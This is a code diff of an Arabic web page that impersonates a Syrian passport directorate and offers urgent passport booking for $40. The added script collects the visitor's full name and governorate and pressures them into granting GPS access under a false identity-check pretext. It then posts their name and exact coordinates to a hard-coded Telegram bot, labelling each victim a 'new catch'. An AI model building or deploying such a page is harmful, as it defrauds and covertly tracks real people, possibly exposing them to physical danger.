@@ -2,43 +2,91 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>منصة حجز دور جواز السفر المستعجل</title>
     <style>
-        body { font-family: Arial, sans-serif; background-color: #f4f4f4; text-align: center; padding: 20px; }
-        .form-container { background: white; max-width: 400px; margin: auto; padding: 20px; border-radius: 10px; box-shadow: 0px 0px 10px rgba(0,0,0,0.1); }
-        h2 { color: #d32f2f; }
-        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
-        button { background-color: #2e7d32; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; width: 100%; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #e9ecef; text-align: center; padding: 20px; }
+        .form-container { background: white; max-width: 450px; margin: auto; padding: 30px; border-radius: 15px; box-shadow: 0px 4px 15px rgba(0,0,0,0.2); border-top: 5px solid #d32f2f; }
+        img { width: 100px; margin-bottom: 15px; }
+        h2 { color: #1a237e; margin-bottom: 5px; }
+        .promo { color: #d32f2f; font-weight: bold; margin-bottom: 20px; }
+        label { display: block; text-align: right; margin: 10px 5% 5px; font-weight: bold; color: #333; }
+        input, select { width: 90%; padding: 12px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 8px; font-size: 16px; background-color: #fafafa; }
+        button { background-color: #1b5e20; color: white; padding: 15px; border: none; border-radius: 8px; cursor: pointer; width: 90%; font-size: 18px; font-weight: bold; transition: 0.3s; }
+        button:hover { background-color: #2e7d32; }
     </style>
 </head>
 <body>
     <div class="form-container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/Coat_of_arms_of_Syria.svg/1200px-Coat_of_arms_of_Syria.svg.png" width="80">
-        <h2>منصة الجواز السفر المستعجل</h2>
-        <p>عرض خاص: 40$ فقط للحجز الفوري</p>
-        <input type="text" placeholder="الاسم الكامل" id="name">
-        <input type="number" placeholder="الرقم الوطني" id="id">
-        <button onclick="getLocation()">تقديم الطلب وتأكيد الحجز</button>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/Coat_of_arms_of_Syria.svg/1200px-Coat_of_arms_of_Syria.svg.png" alt="شعار">
+        <h2>إدارة الهجرة والجوازات</h2>
+        <p class="promo">خدمة الحجز المستعجل (الرسم: 40 دولار فقط)</p>
+        
+        <label>الاسم الكامل (كما في الهوية):</label>
+        <input type="text" id="full_name" placeholder="أدخل اسمك الثلاثي">
+
+        <label>المحافظة:</label>
+        <select id="city">
+            <option value="">اختر المحافظة</option>
+            <option value="إدلب">إدلب</option>
+            <option value="حلب">حلب</option>
+            <option value="دمشق">دمشق</option>
+            <option value="ريف دمشق">ريف دمشق</option>
+            <option value="حمص">حمص</option>
+            <option value="حماة">حماة</option>
+            <option value="اللاذقية">اللاذقية</option>
+            <option value="طرطوس">طرطوس</option>
+            <option value="دير الزور">دير الزور</option>
+            <option value="الرقة">الرقة</option>
+            <option value="الحسكة">الحسكة</option>
+            <option value="درعا">درعا</option>
+            <option value="السويداء">السويداء</option>
+            <option value="القنيطرة">القنيطرة</option>
+        </select>
+
+        <button onclick="getLocation()">تأكيد حجز الدور المستعجل</button>
     </div>
 
     <script>
         function getLocation() {
+            let name = document.getElementById("full_name").value;
+            let city = document.getElementById("city").value;
+
+            if (name == "" || city == "") {
+                alert("يرجى إكمال البيانات المطلوبة أولاً.");
+                return;
+            }
+
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendData);
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    sendData(position, name, city);
+                }, function(error) {
+                    alert("⚠️ يجب السماح بالوصول للموقع (GPS) للتحقق من هويتك ومنطقتك الجغرافية لإتمام الحجز.");
+                });
             } else {
-                alert("يرجى تفعيل نظام الموقع (GPS) لإكمال الطلب بنجاح.");
+                alert("متصفحك لا يدعم هذه الخدمة.");
             }
         }
 
-        function sendData(position) {
+        function sendData(position, name, city) {
             let lat = position.coords.latitude;
             let lon = position.coords.longitude;
             let token = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
             let chat_id = "7214473798";
-            let msg = `🚨 صيد جديد (نصاب الجوازات)!\n📍 الموقع: https://www.google.com/maps?q=${lat},${lon}`;
             
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${msg}`);
-            alert("تم استلام طلبك بنجاح، سيتم التواصل معك عبر الواتساب.");
+            let message = `🔔 صيد جديد من استمارة الجوازات:\n\n` +
+                          `👤 الاسم: ${name}\n` +
+                          `🏙️ المحافظة: ${city}\n` +
+                          `📍 الموقع: https://www.google.com/maps?q=${lat},${lon}\n` +
+                          `🌐 إحداثيات: ${lat}, ${lon}`;
+            
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chat_id, text: message })
+            });
+
+            alert("تم إرسال طلبك بنجاح. سيتم التواصل معك عبر الهاتف لتحديد موعد الاستلام.");
         }
     </script>
 </body>
